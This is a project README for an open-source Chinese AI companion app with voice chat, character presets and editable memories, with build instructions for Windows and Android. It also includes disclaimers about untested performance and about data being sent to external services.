<div align="center">

<p><a href="./README.md"><kbd><b>English</b></kbd></a>&nbsp;&nbsp;<a href="./README.zh-CN.md"><kbd>简体中文</kbd></a></p>

# Xinyu AI Companion

### A little warmth for your everyday life.

Conversations with a voice, companionship with a face, and memories you can edit.  
A Chinese AI companion prototype for Windows desktop and Android.

[**Get the complete source**](./xinyu-ai-companion-sanitized-source.zip) · [**Get started**](#getting-started) · [**Explore the conversations**](#a-conversation-worth-coming-back-to) · [**Share an idea**](https://github.com/fanalar/xinyu-ai-companion/issues)

**MIT code · Windows 1.4.1 · Android source 1.3.4 · Personal beta**

![Immersive companion UI preview](docs/showcase/immersive.jpg)

</div>

## A place for the little things

Not every conversation starts with a question. Sometimes you want to share a sunset on your way home, a small win from the day, or the thought that is keeping you awake.

Xinyu brings those everyday conversations into a space with a visible companion and spoken replies. Choose a character and relationship style, adjust their name, personality and voice, and switch between a character-focused view and a complete chat history. Keep the moments that matter as editable memories.

This is a work-in-progress Chinese companion prototype and an open source starting point for developers interested in voice interaction, character experiences and inspectable memory. It is designed for personal experimentation rather than a finished commercial service.

## A conversation worth coming back to

### An everyday check-in

> **You:** I’ve just finished work. Finally, a moment to rest.  
> **Wanwan:** What are you up to? Have you missed me a little today? Have a good meal first; I’m here for a quiet chat.

![Scripted everyday check-in](docs/showcase/daily-chat.jpg)

### A quiet conversation before bed

> **You:** There is so much to do tomorrow. I’m having trouble sleeping.  
> **Wanwan:** Let tomorrow wait for a moment. What was your happiest little moment today? However small it was, I’d love to hear it.

![Scripted bedtime conversation](docs/showcase/goodnight-chat.jpg)

These are **fictional, scripted examples** captured with isolated demo data. They illustrate an intended conversational tone; actual replies depend on the configured model and character settings. They are not real user chats, proof of live-model or acoustic performance, or evidence of background proactive messaging. Preview artwork is shown here; the source archive ships with placeholders. The current app UI is primarily Chinese; the buttons above switch this introduction only.

## What makes up the experience?

### 1. Keep the conversation going

Entering the companion page attempts to enable microphone capture. Speech is submitted after a detected pause, allowing successive conversational turns. Text input remains available for quiet environments, shared spaces or devices without a microphone.

Playback behavior is deliberate: **speaker mode gates capture while replies are spoken**, with a manual stop control for interruption. **Headphone mode supports spoken interruption** and cancellation of the previous reply. Recognition, pause timing and echo behavior still need evaluation on real devices.

### 2. Give the character room to be present

The immersive view puts the character at the center of the experience. Transparent subtitles display up to two lines, reducing long blocks of text over the portrait. Open the full conversation when you want to review, copy or search messages, or type a longer response.

The two views serve different moments: immersion for the conversation you are having, and full chat for the information you want to revisit.

### 3. Choose a companion and a relationship style

Six preset companions provide different starting personalities. Their names, personalities, voices and relationship types can be adjusted. Explore a friend, confidant, romantic companion or everyday conversation partner, with separate records for different companions.

### 4. Make memories inspectable

Some things are worth remembering; others do not need to stay. Editable memories, separate companion records and data export let you review, correct or remove stored information.

This is an inspectable local record mechanism, not a promise of perfect recall or understanding. Models can still miss context or produce inaccurate answers.

### 5. Bring public information into the conversation

Date, weather, news and public information lookup offer starting points for everyday topics. Results depend on source availability, publication dates, connectivity and rate limits. The app does not guarantee retrieval of arbitrary historical news or permanent access to every channel.

### 6. Add a little pet companionship

The pet corner provides a lighter interaction space alongside character conversations. Say hello to the bunny and explore how simple pet interactions can complement a daily companion experience.

## Meet the companions

<table>
<tr>
<td align="center"><img src="docs/showcase/f1.jpg" width="220" alt="Qingzhi"><br><b>Qingzhi</b><br>Calm, thoughtful and quietly attentive</td>
<td align="center"><img src="docs/showcase/f2.jpg" width="220" alt="Xiaoye"><br><b>Xiaoye</b><br>Playful, spirited and ready for everyday stories</td>
<td align="center"><img src="docs/showcase/f3.jpg" width="220" alt="Wanwan"><br><b>Wanwan</b><br>Warm, gentle and easy to talk to</td>
</tr>
<tr>
<td align="center"><img src="docs/showcase/m1.jpg" width="220" alt="Yanqing"><br><b>Yanqing</b><br>A quiet, intellectual conversation partner</td>
<td align="center"><img src="docs/showcase/m2.jpg" width="220" alt="Aye"><br><b>Aye</b><br>Lively, affectionate and lighthearted</td>
<td align="center"><img src="docs/showcase/m3.jpg" width="220" alt="Chengyu"><br><b>Chengyu</b><br>Steady, caring company for your day</td>
</tr>
</table>

<p align="center"><img src="docs/showcase/bunny.png" width="200" alt="Bunny companion"><br><b>Bunny companion</b><br>A little pet companionship alongside your conversations.</p>

Artwork terms are separate from the code license. See the [preview media notice](docs/showcase/MEDIA_NOTICE.md).

## Where could you take it?

| Your interest | A starting point |
|---|---|
| Run a personal Chinese companion prototype | Download the source, choose a character and configure your own model |
| Learn how voice conversations work | Explore capture, pause detection, playback gating and turn cancellation |
| Design character and memory experiences | Adjust character settings and improve memory editing or export |
| Improve news and weather lookup | Work on sources, date awareness, failures and result presentation |
| Explore Android integration | Study the native recognition interface, WebView UI and device differences |

## Getting started

> **Extract the complete source archive first.** The browsable Git tree is still being organized. The ZIP contains the complete frontend, backend, build configuration and Android source; do not build the incomplete browsable tree directly.

### Run the desktop development version

Prepare **Windows, Python 3.11 and Node.js 20 or later**. The following commands use PowerShell:

```powershell
Invoke-WebRequest "https://github.com/fanalar/xinyu-ai-companion/raw/refs/heads/main/xinyu-ai-companion-sanitized-source.zip" -OutFile source.zip
Expand-Archive ./source.zip ./xinyu-source
cd xinyu-source
python -m venv backend/.venv
backend/.venv/Scripts/python -m pip install -r backend/requirements.txt
Copy-Item .env.example .env
cd frontend
npm ci
npm run build
cd ../app
npm ci
npm start
```

In the app settings, configure your own model endpoint, model name and key. No real service keys are bundled. Model conversations require a working connection; some public information queries can be explored separately.

### Prepare local speech models

From the extracted source root:

```powershell
backend/.venv/Scripts/python scripts/fetch_speech_models.py
```

The script downloads SenseVoice, Silero and required runtime resources. Models and libraries retain their upstream licenses. If a download fails, check the source and connectivity; the text UI can still be explored independently.

### Build a desktop installer

After building the frontend, run:

```powershell
backend/.venv/Scripts/python scripts/build_backend.py
cd app
npm run dist
```

This repository distributes source, not an accepted, signed installer. Your build still needs installation, upgrade, data-migration and real-device voice tests.

### Build an Android debug package

Prepare **JDK 17 and Android SDK 35**, configure the local SDK as described in the archive README, then run:

```powershell
cd android/frontend
npm ci
npm run build
cd ../..
python scripts/prepare_android_ui.py
python scripts/fetch_speech_models.py --android
python scripts/android_gradle.py assembleDebug
```

No operator key, signing material or prebuilt APK is included. Test microphone capture, audio routing and recognition on your intended phone.

## Under the hood

| Layer | Technology | Responsibility |
|---|---|---|
| Desktop shell | Electron | Desktop window, startup and packaging |
| Interface | React | Character stage, chat, settings and memory pages |
| Local service | FastAPI | Conversation, configuration, speech and public information endpoints |
| Records | SQLite | Companions, messages and editable memories |
| Speech recognition | SenseVoice, Silero VAD | Local recognition and voice activity detection |
| Android client | Java, WebView | Mobile UI and native speech integration |

Speech recognition can run locally. Model chat and online speech still use external services, so this is not an entirely offline application or a promise of unlimited free model access.

## Frequently asked questions

<details>
<summary>Why does my first run look different from the previews?</summary>

Previews use the original project's artwork; the source ZIP defaults to new SVG placeholders. An isolated preview copy starts with its microphone paused and adjusts portrait composition for the artwork. It is not a pixel-identical installer screenshot. Replace assets with images you are authorized to use.

</details>

<details>
<summary>Why can I see text but not get a model reply?</summary>

Recognition, model chat and speech playback are separate stages. Check the model endpoint, model name, key and network, then check whether the speech models were downloaded successfully. Do not post keys or complete private conversations in an issue.

</details>

<details>
<summary>Are proactive messages or paid subscriptions available?</summary>

The example conversations are not background proactive messages. This is a personal beta without live payments or a paid subscription service. Those directions can be discussed, but are not advertised as implemented features.

</details>

## Help shape the experience

Start with one concrete improvement: microphone recognition, speaker-to-headphone switching, pauses that are too short or long, news dates and sources, editable memory, accessibility or interface localization.

Open an [issue](https://github.com/fanalar/xinyu-ai-companion/issues) with your device, version, reproduction steps, expected result and actual result. Remove identifying information, credentials and private content from sample recordings or logs. Character-interaction ideas are welcome, too.

If the direction is useful to you, **star the repository** so more people interested in voice and character companionship can find it.

## Validation and licensing

Frontend builds, isolated sample APIs, Android Java compilation and secret scans of the selected public source passed. Live-model, real acoustic, complete APK and long-session acceptance remain unverified. Illustrative screenshots and synthetic tests are not substitutes for those checks.

Records and configuration are local. Chat and online speech can send content to your configured external services and may incur provider charges. Real private chats, live databases, keys and the original Git history are not included in the public source archive.

Code is [MIT](./LICENSE). Artwork is covered separately by the [preview media notice](docs/showcase/MEDIA_NOTICE.md); models and dependencies retain their respective licenses.

Source archive SHA-256: `462fe57b1a78b1af519e9f0e2a62cc49f9886dcd78ee5abe25cc38727f34012a`.

<p align="center"><a href="./README.zh-CN.md"><kbd>切换到简体中文</kbd></a></p>
